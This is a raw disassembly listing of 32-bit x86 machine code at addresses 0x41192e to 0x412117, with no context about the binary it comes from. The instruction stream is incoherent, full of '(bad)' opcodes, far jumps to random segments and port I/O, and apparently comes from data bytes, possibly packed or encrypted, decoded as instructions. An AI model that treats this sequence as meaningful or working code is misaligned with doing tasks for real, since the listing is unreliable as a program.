  41192e:	ror    BYTE PTR [esi+0x60369258],cl
  411934:	es jno 0x41190d
  411937:	mov    ds:0xbbf3dafb,al
  41193c:	data16 adc BYTE PTR [eax],bl
  41193f:	sub    BYTE PTR [edi+0x65],cl
  411942:	clc    
  411943:	jecxz  0x4119c1
  411945:	enterw 0xe1b7,0x9c
  41194a:	xlat   BYTE PTR ds:[ebx]
  41194b:	clc    
  41194c:	pop    ebp
  41194d:	loope  0x4118e7
  41194f:	mov    bh,0xf9
  411951:	mov    WORD PTR [ecx-0x1404f33e],es
  411957:	pop    esp
  411958:	aaa    
  411959:	xchg   edi,eax
  41195a:	push   ebp
  41195b:	loopne 0x411963
  41195d:	ins    DWORD PTR es:[edi],dx
  41195e:	ret    0xcebe
  411961:	leave  
  411962:	arpl   WORD PTR [edx+0x4f89af91],bp
  411968:	mov    ebx,ebp
  41196a:	xchg   edi,eax
  41196b:	and    eax,0x3ce7cf3f
  411970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411971:	jnp    0x41191f
  411973:	fldpi  
  411975:	push   DWORD PTR [edx-0x4cf736a4]
  41197b:	in     eax,0x8a
  41197d:	adc    esi,DWORD PTR [esi]
  41197f:	sub    DWORD PTR [edi-0x7c],esp
  411982:	mov    ah,0x2f
  411984:	jb     0x411969
  411986:	sbb    eax,0xb716d99
  41198b:	lods   eax,DWORD PTR ds:[esi]
  41198c:	jmp    0x4119d3
  41198e:	sahf   
  41198f:	repnz mov ecx,0x5a1e6831
  411995:	cmp    edx,DWORD PTR [edx-0x8]
  411998:	retf   
  411999:	cmp    eax,0xcdb477aa
  41199e:	jmp    0x7d80:0x25d3db5d
  4119a5:	push   ds
  4119a6:	in     eax,dx
  4119a7:	adc    edx,edx
  4119a9:	aaa    
  4119aa:	retf   
  4119ab:	(bad)  
  4119ac:	pusha  
  4119ad:	retf   0x46e0
  4119b0:	mov    eax,0x25dd54a
  4119b5:	mov    ds:0x88f2f75e,eax
  4119ba:	or     al,0x4d
  4119bc:	or     ebp,DWORD PTR [eax-0x286bd55a]
  4119c2:	fsubr  DWORD PTR [ebx]
  4119c4:	or     edx,DWORD PTR [ecx-0x6604cef2]
  4119ca:	add    BYTE PTR [edi+0x15],bl
  4119cd:	push   ds
  4119ce:	test   eax,0x33235e06
  4119d3:	add    eax,0xbe7db02e
  4119d8:	aad    0x39
  4119da:	or     edx,DWORD PTR [ebx+0xd]
  4119dd:	je     0xac51a7a1
  4119e3:	es push ebx
  4119e5:	jp     0x411a65
  4119e7:	repz jnp 0x411a26
  4119ea:	retf   
  4119eb:	adc    dl,BYTE PTR [edx]
  4119ed:	cmp    al,0x1a
  4119ef:	add    edi,ebp
  4119f1:	cmp    eax,0x9bcade91
  4119f6:	mov    bl,0x3c
  4119f8:	inc    ebp
  4119f9:	pop    ebp
  4119fa:	fs ret 0x3e1a
  4119fe:	sbb    bh,BYTE PTR [ecx+0x5e]
  411a01:	jns    0x4119eb
  411a03:	outs   dx,BYTE PTR ds:[esi]
  411a04:	jl     0x4119b5
  411a06:	jecxz  0x411993
  411a08:	popa   
  411a09:	jp     0x411a3d
  411a0b:	xchg   edi,eax
  411a0c:	jne    0x411a3b
  411a0e:	jg     0x411a63
  411a10:	in     eax,dx
  411a11:	outs   dx,BYTE PTR ds:[esi]
  411a12:	repz div BYTE PTR [eax+edi*1-0x69]
  411a17:	jne    0x411a4a
  411a19:	push   cs
  411a1a:	xor    edx,ebx
  411a1c:	sub    DWORD PTR [ecx],esp
  411a1e:	mov    al,ds:0xdd75b7de
  411a23:	mov    eax,ds:0x523e671e
  411a28:	pop    ecx
  411a29:	(bad)  
  411a2a:	int3   
  411a2b:	xchg   edx,eax
  411a2c:	or     cl,ch
  411a2e:	push   edx
  411a2f:	push   edi
  411a30:	lods   eax,DWORD PTR ds:[esi]
  411a31:	xchg   BYTE PTR [ecx+0x39],dl
  411a34:	inc    ecx
  411a35:	leave  
  411a36:	out    dx,al
  411a37:	stos   BYTE PTR es:[edi],al
  411a38:	in     al,0xe4
  411a3a:	imul   edx,DWORD PTR [edi],0xffffff83
  411a3d:	ds xchg ebx,eax
  411a3f:	ss hlt 
  411a41:	xor    ah,BYTE PTR [eax+0x1e]
  411a44:	or     DWORD PTR [ebp+0x4c],esi
  411a47:	loopne 0x411a28
  411a49:	icebp  
  411a4a:	xchg   ecx,eax
  411a4b:	mov    ?,WORD PTR [eax+0x3d90e0a7]
  411a51:	xor    dl,dh
  411a53:	sub    DWORD PTR [edi-0x61d1630],0x71
  411a5a:	xor    ecx,DWORD PTR [edx+ebx*2-0x6b]
  411a5e:	or     al,0x9b
  411a60:	dec    ebx
  411a61:	stos   BYTE PTR es:[edi],al
  411a62:	das    
  411a63:	and    ecx,DWORD PTR [edx+ebx*1-0x58]
  411a67:	stos   BYTE PTR es:[edi],al
  411a68:	xchg   edx,eax
  411a69:	rcr    DWORD PTR [ebp+edi*4+0x61],1
  411a6d:	jbe    0x411a55
  411a6f:	inc    edi
  411a70:	jae    0x411a8f
  411a72:	or     edi,DWORD PTR [esi-0x6a]
  411a75:	call   0xab80acf8
  411a7a:	retf   
  411a7b:	mov    edi,0x67afe3a9
  411a80:	test   DWORD PTR [ebp-0x79],eax
  411a83:	sar    BYTE PTR [eax-0x400f7372],cl
  411a89:	out    0x62,al
  411a8b:	mov    esi,0x45291bdf
  411a90:	mov    ds:0x7f99369f,eax
  411a95:	mov    dl,BYTE PTR ds:0x79d59fae
  411a9b:	sbb    DWORD PTR [esi+ecx*2-0x2],ecx
  411a9f:	mov    WORD PTR [edi+eax*8-0x2d],?
  411aa3:	jns    0x411a84
  411aa5:	mov    ds:0xb96045b3,al
  411aaa:	loop   0x411ae7
  411aac:	push   cs
  411aad:	and    eax,0x915ad86
  411ab2:	push   ss
  411ab3:	jnp    0x411a6b
  411ab5:	shl    BYTE PTR [ebx],cl
  411ab7:	pushf  
  411ab8:	mov    esi,0x2cf8c937
  411abd:	and    ecx,DWORD PTR [esi-0x44]
  411ac0:	test   BYTE PTR [edi+0xe4585cf],0xe0
  411ac7:	call   0x736:0xf724c0c2
  411ace:	mov    dl,0x53
  411ad0:	jle    0x411a77
  411ad2:	and    eax,eax
  411ad4:	data16 loopne 0x411a65
  411ad7:	jmp    0x411a77
  411ad9:	pop    esp
  411ada:	not    BYTE PTR [edx+edi*4+0x7]
  411ade:	push   cs
  411adf:	dec    esp
  411ae0:	loope  0x411ae7
  411ae2:	fistp  WORD PTR [ecx+0x26bd6b76]
  411ae8:	add    BYTE PTR [edi+0x18],dh
  411aeb:	aaa    
  411aec:	out    0x4e,al
  411aee:	shr    BYTE PTR ds:0x870e87f4,1
  411af4:	lahf   
  411af5:	jo     0x411a88
  411af7:	sub    eax,0xa117f1f7
  411afc:	inc    edx
  411afd:	out    0x4,al
  411aff:	jo     0x411a95
  411b01:	xchg   esi,eax
  411b02:	mov    ebx,0x31306b72
  411b07:	jl     0x411b20
  411b09:	and    al,0x68
  411b0b:	inc    eax
  411b0c:	mov    dl,0x9b
  411b0e:	mov    eax,fs
  411b10:	retf   0x57b2
  411b13:	push   es
  411b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b15:	call   0xac1416cb
  411b1a:	mov    esp,ebx
  411b1c:	or     al,0x5b
  411b1e:	xlat   BYTE PTR ss:[ebx]
  411b20:	jb     0x411ac7
  411b22:	inc    eax
  411b23:	dec    esi
  411b24:	scas   eax,DWORD PTR es:[edi]
  411b25:	jbe    0x411b06
  411b27:	push   ebx
  411b28:	out    dx,al
  411b29:	jg     0x411acb
  411b2b:	cmp    BYTE PTR [edx],bl
  411b2d:	push   ebx
  411b2e:	(bad)  
  411b2f:	imul   ebp,DWORD PTR [ebp+0x7e04d82e],0x6d
  411b36:	push   edi
  411b37:	adc    ch,0xa3
  411b3a:	mov    bh,0x8e
  411b3c:	jmp    0x6382e43f
  411b41:	das    
  411b42:	(bad)
  411b45:	add    ebx,DWORD PTR [eax+0x2c92af97]
  411b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b4c:	imul   esp,DWORD PTR [ebp-0x76],0x20b24482
  411b53:	sub    DWORD PTR [eax+edx*8+0x48fd06c4],ebp
  411b5a:	mov    DWORD PTR [esi-0x7a],esi
  411b5d:	mov    BYTE PTR [edi+eax*8],bh
  411b60:	push   0x2b42287d
  411b65:	in     al,dx
  411b66:	rol    DWORD PTR [ebx],1
  411b68:	dec    edi
  411b69:	popa   
  411b6a:	and    dl,dh
  411b6c:	mov    eax,0xaa617c7c
  411b71:	aad    0xc9
  411b73:	scas   al,BYTE PTR es:[edi]
  411b74:	retf   
  411b75:	in     al,dx
  411b76:	push   eax
  411b77:	inc    eax
  411b78:	jb     0x411bc6
  411b7a:	dec    ecx
  411b7b:	adc    DWORD PTR [ebx-0x7b],esi
  411b7e:	inc    edx
  411b7f:	les    ebx,FWORD PTR [eax-0x73]
  411b82:	mov    eax,0xead40bde
  411b87:	jmp    0x5b2a:0xbe5b98de
  411b8e:	repnz sub eax,0x1e14f83
  411b94:	fist   WORD PTR [ebx-0x7ad762ac]
  411b9a:	sbb    BYTE PTR [ecx+0x6c5d1c33],al
  411ba0:	mov    eax,0x27a00a0c
  411ba5:	or     esp,ecx
  411ba7:	lods   al,BYTE PTR ds:[esi]
  411ba8:	(bad)  
  411ba9:	fstp   TBYTE PTR [edx-0x39]
  411bac:	xor    eax,0x55bffc3f
  411bb1:	xchg   ecx,eax
  411bb2:	push   ss
  411bb3:	loope  0x411be6
  411bb5:	jmp    0x411c0c
  411bb7:	test   al,0x8a
  411bb9:	test   eax,0x1f290018
  411bbe:	jmp    0x39d5:0x2f4bb4a1
  411bc5:	call   0xf727:0xe4a3b28a
  411bcc:	loope  0x411c33
  411bce:	jmp    0xc1a7:0x67c705e7
  411bd5:	ss xchg esi,eax
  411bd7:	pusha  
  411bd8:	xchg   ebp,eax
  411bd9:	or     DWORD PTR [ebx+edi*2+0x5b],esp
  411bdd:	fidivr DWORD PTR [ebp+edi*8+0x7a]
  411be1:	leave  
  411be2:	dec    edi
  411be3:	aad    0x37
  411be5:	inc    ebp
  411be6:	add    BYTE PTR [ebp+0x33],ch
  411be9:	mov    esi,0x52e2d24c
  411bee:	jmp    0x411bb4
  411bf0:	(bad)  
  411bf1:	cdq    
  411bf2:	adc    BYTE PTR [ebx],dh
  411bf4:	and    al,bl
  411bf6:	scas   eax,DWORD PTR es:[edi]
  411bf7:	retf   0x41ab
  411bfa:	ins    BYTE PTR es:[edi],dx
  411bfb:	jmp    0xe1238008
  411c00:	inc    ecx
  411c01:	les    ebx,FWORD PTR [esp+esi*2-0x32]
  411c05:	push   0xffffffc7
  411c07:	sahf   
  411c08:	dec    edx
  411c09:	fld    QWORD PTR [esi]
  411c0b:	sbb    dh,BYTE PTR [ecx-0x34]
  411c0e:	jb     0x411bfc
  411c10:	and    DWORD PTR [ebx-0x51],esi
  411c13:	mov    edi,0x45f0cb2a
  411c18:	mov    cl,0x64
  411c1a:	pushf  
  411c1b:	mov    ebp,0xaf9b3fff
  411c20:	shr    ch,cl
  411c22:	add    esi,DWORD PTR [eax-0x3b]
  411c25:	sub    BYTE PTR [eax+0x29],ah
  411c28:	mov    ds:0x9e8150a1,al
  411c2d:	inc    ebx
  411c2e:	out    0xbd,al
  411c30:	inc    ebx
  411c31:	stos   DWORD PTR es:[edi],eax
  411c32:	and    al,BYTE PTR [ebx+0x426071ad]
  411c38:	leave  
  411c39:	jae    0x411c9b
  411c3b:	jmp    0xcbc53744
  411c40:	nop
  411c41:	mov    ds:0xc50725c,al
  411c46:	mov    dh,BYTE PTR [esi]
  411c48:	(bad)  
  411c49:	out    dx,eax
  411c4a:	(bad)  
  411c4c:	enter  0xf34b,0xf9
  411c50:	mov    edx,cs
  411c52:	adc    esi,DWORD PTR [edi+0x77]
  411c55:	in     al,dx
  411c56:	mov    ch,0x82
  411c58:	cld    
  411c59:	lds    ecx,FWORD PTR [ebx]
  411c5b:	aad    0xc
  411c5d:	sti    
  411c5e:	popf   
  411c5f:	pop    esp
  411c60:	jp     0x411c38
  411c62:	ins    BYTE PTR es:[edi],dx
  411c63:	xchg   DWORD PTR [esi-0x63],esp
  411c66:	arpl   WORD PTR [eax],bp
  411c68:	or     DWORD PTR [edi+edx*2-0x3c4c3b2d],0x68
  411c70:	mov    esi,0x6bf00794
  411c75:	add    eax,DWORD PTR [ecx-0x2b]
  411c78:	xchg   dl,cl
  411c7a:	das    
  411c7b:	xor    BYTE PTR [ebx+edi*8-0x194af0c6],bh
  411c82:	cmp    DWORD PTR [ebx+0x511d3f76],0xd56d8109
  411c8c:	jl     0x411cd3
  411c8e:	rcr    BYTE PTR [ecx-0x14],1
  411c91:	call   0xf199:0x4e7dfc62
  411c98:	ret    
  411c99:	loopne 0x411c85
  411c9b:	loope  0x411d1a
  411c9d:	fimul  DWORD PTR [eax+0x5c]
  411ca0:	inc    ebp
  411ca1:	imul   ebp,DWORD PTR [edx+edi*8-0x56],0xee32dd3
  411ca9:	sub    ecx,edx
  411cab:	rcl    cl,cl
  411cad:	out    0xfd,al
  411caf:	inc    BYTE PTR ds:0x67bbddb
  411cb5:	in     al,0xd6
  411cb7:	and    DWORD PTR [eax+0x61139e6c],esi
  411cbd:	out    0x12,al
  411cbf:	mov    BYTE PTR es:[ecx+0x5707ed62],ch
  411cc6:	add    ecx,esi
  411cc8:	mov    cl,0xd4
  411cca:	cmp    ebp,DWORD PTR [esi]
  411ccc:	push   es
  411ccd:	sub    DWORD PTR [edx-0x56],edi
  411cd0:	icebp  
  411cd1:	int3   
  411cd2:	add    eax,DWORD PTR [edi]
  411cd4:	mov    esi,0xbd6fe90d
  411cd9:	(bad)  
  411cda:	and    BYTE PTR [ebx],bh
  411cdc:	clc    
  411cdd:	add    BYTE PTR [ecx-0x77],ch
  411ce0:	inc    esi
  411ce1:	jne    0x411c74
  411ce3:	push   edi
  411ce4:	idiv   BYTE PTR [ebx]
  411ce6:	(bad)  
  411ce7:	push   esp
  411ce8:	mov    ebp,0xe2c56621
  411ced:	mov    esp,0x78d83a3
  411cf2:	add    eax,0x95f707e1
  411cf7:	iret   
  411cf8:	adc    DWORD PTR [ebx+0x19],ebx
  411cfb:	adc    eax,0x839850bb
  411d00:	sbb    al,0x10
  411d02:	jp     0x411c9a
  411d04:	adc    dh,BYTE PTR [ebx+ebx*8+0x45]
  411d08:	and    BYTE PTR [eax+0x1eee1a4c],dh
  411d0e:	aam    0x7e
  411d10:	sub    cl,BYTE PTR es:[edi]
  411d13:	xor    esp,ebx
  411d15:	adc    eax,0x216e4cd4
  411d1a:	dec    ecx
  411d1b:	cwde   
  411d1c:	fisttp DWORD PTR [edx]
  411d1e:	mov    ebp,0xfa31e44a
  411d23:	dec    ebp
  411d24:	xchg   bl,ah
  411d26:	dec    ecx
  411d27:	out    0x59,al
  411d29:	sub    BYTE PTR [ebp-0x27],0x3a
  411d2d:	or     eax,0xa1e0fcd2
  411d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d33:	in     eax,0xf
  411d35:	sti    
  411d36:	lahf   
  411d37:	mov    bh,0xc6
  411d39:	lods   eax,DWORD PTR ds:[esi]
  411d3a:	sub    BYTE PTR [eax],ah
  411d3c:	arpl   WORD PTR [ebx],si
  411d3e:	sub    ebp,ebp
  411d40:	jns    0x411d40
  411d42:	jne    0x411d01
  411d44:	jo     0x411cf4
  411d46:	ror    al,1
  411d48:	out    0x53,al
  411d4a:	fld    QWORD PTR [esi-0x15]
  411d4d:	pop    ds
  411d4e:	rcl    BYTE PTR [edi-0x168a45fa],cl
  411d54:	mov    esp,0x8cb9ce4d
  411d59:	xchg   edi,eax
  411d5a:	mov    bl,0xa8
  411d5c:	push   esp
  411d5d:	pop    ebp
  411d5e:	mov    WORD PTR [edi],?
  411d60:	cld    
  411d61:	std    
  411d62:	jbe    0x411d69
  411d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d65:	sub    edx,esi
  411d67:	push   ss
  411d68:	call   0x9777fdde
  411d6d:	add    edx,DWORD PTR [ecx-0x17]
  411d70:	mov    ebx,0x2437377f
  411d75:	stos   DWORD PTR es:[edi],eax
  411d76:	es fsincos 
  411d79:	push   0xa6caf4d3
  411d7e:	mov    esi,0x47b56893
  411d83:	mov    ebp,0xc62df49d
  411d88:	xchg   ecx,eax
  411d89:	adc    eax,0x94685b8c
  411d8e:	int3   
  411d8f:	mov    edx,0x38dcf712
  411d94:	add    ah,BYTE PTR [ebx]
  411d96:	fst    QWORD PTR [ebp+0x517fa11]
  411d9c:	leave  
  411d9d:	mov    dh,0xb4
  411d9f:	xor    esp,DWORD PTR [esi]
  411da1:	les    ebp,FWORD PTR [esi+0x451f219]
  411da7:	daa    
  411da8:	sbb    al,0xb5
  411daa:	dec    esp
  411dab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dac:	je     0x411d4d
  411dae:	mov    ds:0x4a6d9625,eax
  411db3:	add    eax,0xf9e16114
  411db8:	push   0x5b
  411dba:	shr    DWORD PTR [ecx+0x3f7d831d],0x88
  411dc1:	ret    0x59d3
  411dc4:	jp     0x411e0a
  411dc6:	fsubr  DWORD PTR [ecx-0x2da93220]
  411dcc:	xchg   DWORD PTR [esi+0x53],eax
  411dcf:	mov    bl,0xe
  411dd1:	aad    0x18
  411dd3:	sbb    DWORD PTR [ecx],edi
  411dd5:	mov    cl,0x30
  411dd7:	test   DWORD PTR [ebx-0x76f999b4],edi
  411ddd:	sbb    DWORD PTR [eax-0x7d],ebx
  411de0:	jle    0x411e00
  411de2:	jnp    0x411e36
  411de4:	pop    esp
  411de5:	and    DWORD PTR [eax],0x7199ccde
  411deb:	fsubr  QWORD PTR [edx+edi*8+0x2f]
  411def:	xor    DWORD PTR [eax+0x6bfb5bad],esp
  411df5:	inc    eax
  411df6:	adc    cl,BYTE PTR [edi]
  411df8:	sar    DWORD PTR [esi+0x6b],0xee
  411dfc:	shl    edx,cl
  411dfe:	sar    al,0xbe
  411e01:	push   eax
  411e02:	add    bh,BYTE PTR [ebp+0x8]
  411e05:	push   ds
  411e06:	stc    
  411e07:	pop    ebp
  411e08:	aam    0xc9
  411e0a:	mul    BYTE PTR [edx+0x63f2f807]
  411e10:	mov    eax,0x7bc308f3
  411e15:	or     ah,BYTE PTR [eax-0x6c]
  411e18:	cmp    DWORD PTR [eax-0x2a],ebx
  411e1b:	pop    edx
  411e1c:	xchg   ebp,eax
  411e1d:	or     BYTE PTR [ebp-0xcf1e8e2],0xea
  411e24:	fwait
  411e25:	outs   dx,DWORD PTR ds:[esi]
  411e26:	adc    BYTE PTR [ebx-0x58de7c7d],ah
  411e2c:	mov    edx,0xe26b2239
  411e31:	aam    0xfb
  411e33:	pop    eax
  411e34:	jbe    0x411e5d
  411e36:	mov    ?,WORD PTR [esi+ebp*8+0x4]
  411e3a:	pop    es
  411e3b:	popa   
  411e3c:	xor    DWORD PTR [ebx],edi
  411e3e:	div    BYTE PTR [esi-0x1f37f90a]
  411e44:	rol    DWORD PTR [eax],1
  411e46:	mov    al,ds:0x682f7ed6
  411e4b:	imul   DWORD PTR [esi-0x11]
  411e4e:	into   
  411e4f:	add    ch,BYTE PTR [esi]
  411e51:	into   
  411e52:	ins    DWORD PTR es:[edi],dx
  411e53:	or     al,0x8f
  411e55:	jl     0x411e25
  411e57:	push   ds
  411e58:	sahf   
  411e59:	fdiv   QWORD PTR [ebx]
  411e5b:	jle    0x411e54
  411e5d:	inc    esi
  411e5e:	ret    0xdf1c
  411e61:	shr    BYTE PTR [ebx],cl
  411e63:	mov    edx,0x9ed017f8
  411e68:	inc    eax
  411e69:	jb     0x411eb9
  411e6b:	arpl   bx,di
  411e6d:	les    ecx,FWORD PTR [edx+0x6b06f604]
  411e73:	sbb    edi,edi
  411e75:	xor    edx,DWORD PTR [ebp-0x1f665071]
  411e7b:	push   cs
  411e7c:	push   edx
  411e7d:	push   ss
  411e7e:	mov    edx,0xd134129c
  411e83:	push   0xdd4215a6
  411e88:	lahf   
  411e89:	ror    bl,1
  411e8b:	mov    ebx,0xf0dee1f2
  411e90:	mov    BYTE PTR [esi+0x5f],ch
  411e93:	inc    esi
  411e94:	popaw  
  411e96:	ror    edx,1
  411e98:	jmp    0x7be8a76f
  411e9d:	and    al,0xfd
  411e9f:	daa    
  411ea0:	lea    ebp,[edi]
  411ea2:	pop    ebp
  411ea3:	cmp    dh,BYTE PTR [ecx+0x4c]
  411ea6:	and    DWORD PTR [eax-0x33],ebx
  411ea9:	cli    
  411eaa:	jo     0x411f1c
  411eac:	xchg   edi,eax
  411ead:	sbb    eax,0x6ebbc85f
  411eb2:	retf   0x4543
  411eb5:	pop    ebp
  411eb6:	or     edx,DWORD PTR [esi-0x3e]
  411eb9:	sub    DWORD PTR [ecx+ebp*8-0x4d],ebp
  411ebd:	pusha  
  411ebe:	push   ebp
  411ebf:	iret   
  411ec0:	ret    
  411ec1:	scas   eax,DWORD PTR es:[edi]
  411ec2:	inc    edx
  411ec3:	dec    edi
  411ec4:	or     DWORD PTR [ebx-0x5965279e],esi
  411eca:	pop    ecx
  411ecb:	loope  0x411eed
  411ecd:	aad    0x93
  411ecf:	mov    ds:0xf0098112,al
  411ed4:	adc    al,0xf
  411ed6:	jne    0x411ebd
  411ed8:	int3   
  411ed9:	xchg   esi,eax
  411eda:	add    edi,DWORD PTR [ecx]
  411edc:	jb     0x411eee
  411ede:	inc    edx
  411edf:	mov    dh,0x12
  411ee1:	adc    al,0x51
  411ee3:	(bad)  
  411ee4:	cs fiadd WORD PTR fs:[ebp-0x17]
  411ee9:	ret    0xe932
  411eec:	retf   
  411eed:	test   DWORD PTR [esi-0x75],esi
  411ef0:	iret   
  411ef1:	mov    bl,BYTE PTR [ebx-0x42ea2613]
  411ef7:	add    esp,ecx
  411ef9:	mov    dh,0xdd
  411efb:	(bad)  
  411efc:	push   ebx
  411efd:	(bad)  
  411efe:	repnz jmp 0xea95:0x1b806d23
  411f06:	out    0x97,eax
  411f08:	add    DWORD PTR [ecx-0x46],0xffffffe5
  411f0c:	dec    edi
  411f0d:	sahf   
  411f0e:	sbb    DWORD PTR [ebx+0x691764c5],0xffffffe0
  411f15:	daa    
  411f16:	sub    ecx,DWORD PTR [ebx-0xd7d529]
  411f1c:	arpl   bp,cx
  411f1e:	scas   al,BYTE PTR es:[edi]
  411f1f:	pushf  
  411f20:	rcl    ebp,0xc1
  411f23:	mov    eax,ds:0x6a819527
  411f28:	mov    bh,BYTE PTR [ecx-0x6a]
  411f2b:	xor    al,0xb6
  411f2d:	(bad)  
  411f2e:	outs   dx,BYTE PTR ds:[esi]
  411f2f:	cmp    DWORD PTR [eax],edi
  411f31:	sub    eax,0xb7408522
  411f36:	push   edx
  411f37:	cmc    
  411f38:	adc    DWORD PTR [edx-0x4c],eax
  411f3b:	or     eax,0x3e67034a
  411f40:	nop
  411f41:	lds    ebp,FWORD PTR [ecx-0x4c935611]
  411f47:	ds out dx,eax
  411f49:	push   es
  411f4a:	ss mov edi,0x13e3d886
  411f50:	dec    esp
  411f51:	xor    al,0x35
  411f53:	xor    DWORD PTR [edi*4-0x1fe00f15],eax
  411f5a:	test   eax,esp
  411f5c:	sub    ebx,DWORD PTR [ebp+0x71ad0b89]
  411f62:	aam    0xdc
  411f64:	fdivr  DWORD PTR [edx+edi*1]
  411f67:	jecxz  0x411f9c
  411f69:	in     eax,0x5c
  411f6b:	xchg   ebp,eax
  411f6c:	lods   eax,DWORD PTR ds:[esi]
  411f6d:	pop    eax
  411f6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f6f:	push   eax
  411f70:	enter  0x2fe5,0x58
  411f74:	aam    0xf7
  411f76:	push   cs
  411f77:	nop
  411f78:	stos   BYTE PTR es:[edi],al
  411f79:	sar    DWORD PTR [ecx-0x7deacc52],cl
  411f7f:	test   ah,dh
  411f81:	adc    BYTE PTR [ecx-0x32ba0752],ah
  411f87:	sub    BYTE PTR [esi+0x15],ch
  411f8a:	nop
  411f8b:	mov    eax,esi
  411f8d:	or     bl,BYTE PTR [edx+0x6f6c2230]
  411f93:	ja     0x411f2b
  411f95:	nop
  411f96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f97:	mov    es,WORD PTR [esi-0x27128353]
  411f9d:	mov    edx,0xc99545fc
  411fa2:	fs xchg ecx,eax
  411fa4:	mov    BYTE PTR [ebx-0x2a],bh
  411fa7:	inc    esi
  411fa8:	push   ds
  411fa9:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  411fab:	fcmovnbe st,st(5)
  411fad:	test   eax,0xf43faa88
  411fb2:	cmp    ebp,DWORD PTR [eax+0x63969e9a]
  411fb8:	loopne 0x411f91
  411fba:	sbb    al,0x2c
  411fbc:	stos   BYTE PTR es:[edi],al
  411fbd:	shr    BYTE PTR ss:[ebp-0x46f92b0e],0xd5
  411fc5:	push   0x30
  411fc7:	mov    ebp,0xf3af65b6
  411fcc:	inc    BYTE PTR [esi-0x100963d0]
  411fd2:	test   DWORD PTR [esi],ebp
  411fd4:	push   es
  411fd5:	mov    edx,eax
  411fd7:	(bad)  
  411fd8:	daa    
  411fd9:	imul   ecx,DWORD PTR [ebx],0xffffffa8
  411fdc:	jge    0x411fbf
  411fde:	leave  
  411fdf:	jns    0x412052
  411fe1:	loope  0x41203a
  411fe3:	jl     0x41203e
  411fe5:	mov    dh,BYTE PTR [edx+ebx*4]
  411fe8:	ror    ebp,cl
  411fea:	cmp    al,0x8c
  411fec:	aaa    
  411fed:	sbb    DWORD PTR [eax],0x5f089452
  411ff3:	pop    edi
  411ff4:	dec    esp
  411ff5:	call   0x656b:0x6e2c250b
  411ffc:	xor    eax,DWORD PTR [edx+0x6d092dc7]
  412002:	mov    ecx,0x5bc35d01
  412007:	stos   BYTE PTR es:[edi],al
  412008:	jmp    0x2311:0xc7188388
  41200f:	xchg   DWORD PTR [esi+edx*1-0x273b2a27],esp
  412016:	pop    edx
  412017:	sub    DWORD PTR [ecx+0x58ef86fa],0xffffffed
  41201e:	cwde   
  41201f:	stos   DWORD PTR es:[edi],eax
  412020:	pop    ecx
  412021:	sbb    al,0x94
  412023:	test   DWORD PTR [ebp-0x7d5812bc],0xad63674f
  41202d:	inc    edi
  41202e:	xchg   eax,ebp
  412030:	sar    BYTE PTR ds:0xac812e54,0x10
  412037:	or     eax,0xd702f1c7
  41203c:	cs inc ecx
  41203e:	in     eax,0xf9
  412040:	ret    
  412041:	lock aaa 
  412043:	daa    
  412044:	loope  0x41206d
  412046:	popf   
  412047:	sub    al,0x59
  412049:	ins    DWORD PTR es:[edi],dx
  41204a:	or     BYTE PTR [edx+edx*8-0x4a35a79b],0xac
  412052:	mov    ebp,0xee66eb24
  412057:	xchg   ecx,eax
  412058:	jb     0x41209f
  41205a:	pop    ebp
  41205b:	out    dx,eax
  41205c:	or     al,BYTE PTR [ebx+0x49]
  41205f:	mov    ebx,0xf21c69ea
  412064:	jae    0x411ff6
  412066:	sub    bh,bh
  412068:	shl    BYTE PTR [ebp+0x24],0xd1
  41206c:	jle    0x412079
  41206e:	sbb    DWORD PTR [ebp+0x5a33d6fd],edi
  412074:	jmp    0x4120e1
  412076:	into   
  412077:	mov    WORD PTR [ecx-0x7c],gs
  41207a:	(bad)  
  41207b:	in     eax,0xed
  41207d:	aaa    
  41207e:	div    BYTE PTR [esi+0x6cd5da5a]
  412084:	jge    0x4120da
  412086:	es fwait
  412088:	stos   BYTE PTR es:[edi],al
  412089:	call   FWORD PTR [edx+ebp*4+0x68]
  41208d:	stos   BYTE PTR es:[edi],al
  41208e:	xor    DWORD PTR ds:0x3c969f0,0x3ed29b54
  412098:	mov    edx,0x91ad7695
  41209d:	push   ss
  41209e:	(bad)  [esi+0x5f6da9b0]
  4120a4:	jno    0x41210a
  4120a6:	(bad)  
  4120a7:	popf   
  4120a8:	outs   dx,DWORD PTR ds:[esi]
  4120a9:	pop    esp
  4120aa:	leave  
  4120ab:	mov    BYTE PTR ds:0x20cad36d,0xae
  4120b2:	enter  0x71a8,0xcf
  4120b6:	cli    
  4120b7:	shr    DWORD PTR [esi],0x2f
  4120ba:	leave  
  4120bb:	adc    dl,BYTE PTR [eax+eax*1-0xd]
  4120bf:	mov    DWORD PTR [ebp-0x47],edx
  4120c2:	sahf   
  4120c3:	pop    esp
  4120c4:	stos   BYTE PTR es:[edi],al
  4120c5:	inc    ebp
  4120c6:	push   ebp
  4120c7:	ins    DWORD PTR es:[edi],dx
  4120c8:	lods   eax,DWORD PTR ds:[esi]
  4120c9:	lahf   
  4120ca:	pop    ds
  4120cb:	rol    BYTE PTR [ecx+0x3eacf2fb],0x8d
  4120d2:	mov    esi,0x956b54ad
  4120d7:	fwait
  4120d8:	je     0x4120a0
  4120da:	xor    edx,ecx
  4120dc:	aas    
  4120dd:	out    dx,eax
  4120de:	in     eax,0x28
  4120e0:	mov    eax,0x4b9e795
  4120e5:	and    edx,esp
  4120e7:	mov    edx,0xe70fada2
  4120ec:	or     eax,0x249a2912
  4120f1:	outs   dx,DWORD PTR ds:[esi]
  4120f2:	lds    eax,FWORD PTR [esi-0x50af65d5]
  4120f8:	mov    esi,0x647a4595
  4120fd:	pop    es
  4120fe:	xchg   BYTE PTR [ecx],cl
  412100:	ret    
  412101:	pminsw mm4,QWORD PTR [eax+ebp*2]
  412105:	loope  0x412159
  412107:	push   ds
  412108:	stc    
  412109:	leave  
  41210a:	in     eax,0xf9
  41210c:	jae    0x412150
  41210e:	or     BYTE PTR [esi+ecx*1+0xb016ba3],0x9e
  412116:	ins    BYTE PTR es:[edi],dx
  412117:	mov    ebx,0x8b543dc0
